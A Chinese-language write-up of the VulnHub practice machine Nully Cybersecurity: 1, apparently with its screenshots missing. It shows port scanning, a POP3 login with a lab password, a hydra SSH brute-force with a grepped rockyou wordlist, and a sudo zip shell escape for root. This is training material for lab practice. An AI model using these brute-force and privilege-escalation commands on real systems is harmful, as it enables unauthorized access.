# 原创
：  VulnHub渗透测试实战靶场 - NULLY CYBERSECURITY: 1

# VulnHub渗透测试实战靶场 - NULLY CYBERSECURITY: 1

#### VulnHub渗透测试实战靶场 - NULLY CYBERSECURITY: 1

## 题目描述

```
Nully Cybersecurity - this is an easy-intermediate realistic machine.
While working with the machine, you will need to brute force, pivoting (using metasploit, via portfwd), exploitation web app, and using searchsploit.
About: Wait 5-8 minutes before starting for the machine to start its services. Also, check the welcome page on port 80.
Hints: 'cat rockyou.txt | grep bobby &gt; wordlist' for generating wordlist.
Story: You are a Professional White Hat. Small company Nully Cybersecurity hired you to conduct a security test of their internal corporate systems.
Feedback. https://twitter.com/laf3r_
Difficulty: Easy-intermediate
This works better with VirtualBox rather than VMware

```

## 环境下载

> 



## NULLY CYBERSECURITY: 1靶机搭建

> 

- 将下载好的靶机环境，导入 VritualBox，设置为 Host-Only 模式- 将 VMware 中桥接模式网卡设置为 VritualBox 的 Host-only


> 



## 渗透测试

### 信息搜集

> 
用 Nmap 扫描一下目标靶机的端口信息：`sudo nmap -sS -A -Pn 192.168.56.109`，发现开放了 `80、110、2222、8000、9000` 五个端口


> 
用 dirb 扫描一下 80 端口 web 目录：`dirb http://192.168.56.109`


### 漏洞挖掘

> 



> 



```
telnet 192.168.56.109 110
user pentester
pass qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
list
retr 1

```

> 



```
bob
bobby
Bob
BOB
Bobby
BOBBY

```

> 



```
cat rockyou.txt| grep bobby &gt; bobby.txt

```

### getshwll

> 



```
hydra -L user.txt -P bobby.txt -f -V ssh://192.168.56.109:2222

```

> 



### 提权

> 



> 



> 



> 



> 



```
sudo zip $(mktemp -u) /etc/hosts -T -TT 'sh #'

```
